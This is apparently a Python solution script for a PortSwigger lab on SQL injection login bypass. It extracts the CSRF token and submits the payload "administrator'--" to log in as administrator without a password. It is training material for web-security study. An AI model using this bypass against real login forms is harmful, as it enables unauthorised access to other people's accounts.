# Lab 02 — SQL Injection: Login Bypass
# PortSwigger: https://portswigger.net/web-security/sql-injection/lab-login-bypass
#
# Vulnerability: Login form username field
# Aim:           Log in as administrator without knowing the password
#
# Normal query:
#   SELECT * FROM users WHERE username='administrator' AND password='...'
#
# Injected query:
#   SELECT * FROM users WHERE username='administrator'-- AND password='...'
#   → -- comments out the entire password check
#
# Usage: python lab2.py <url>

import sys
import requests
import urllib3
from bs4 import BeautifulSoup
from proxies import proxies
from sqli_utils import banner, section

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LOGIN_PATH  = "login"
SQL_PAYLOAD = "administrator'--"


def get_csrf_token(session, url):
    """
    Fetch the login page and extract the hidden CSRF token.
    The token must be submitted with the POST or the server rejects it.
    """
    response = session.get(url + LOGIN_PATH, proxies=proxies, verify=False)
    soup = BeautifulSoup(response.text, "html.parser")
    token = soup.find("input", {"name": "csrf"})["value"]
    print(f"  ✔  CSRF token: {token}")
    return token


def exploit(session, url):
    section("Submitting SQLi Payload")
    print(f"  ➜  Username payload: {SQL_PAYLOAD}\n")

    token = get_csrf_token(session, url)

    response = session.post(
        url + LOGIN_PATH,
        data={
            "csrf":     token,
            "username": SQL_PAYLOAD,
            "password": "irrelevant",   # ignored — commented out by --
        },
        proxies=proxies,
        verify=False,
    )

    print(f"  {'✔' if response.status_code == 200 else '✘'}  [{response.status_code}]")

    if "Log out" in response.text or "administrator" in response.text:
        print("\n  ★  Login successful — logged in as administrator.")
    else:
        print("\n  ✘  Exploit failed.")


if __name__ == "__main__":
    banner()
    section("LAB 02 — LOGIN BYPASS")

    if len(sys.argv) != 2:
        print("  Usage: python lab2.py <url>")
        sys.exit(1)

    target = sys.argv[1].rstrip("/") + "/"

    # Session keeps the CSRF cookie and session cookie in sync across GET → POST
    session = requests.Session()
    exploit(session, target)
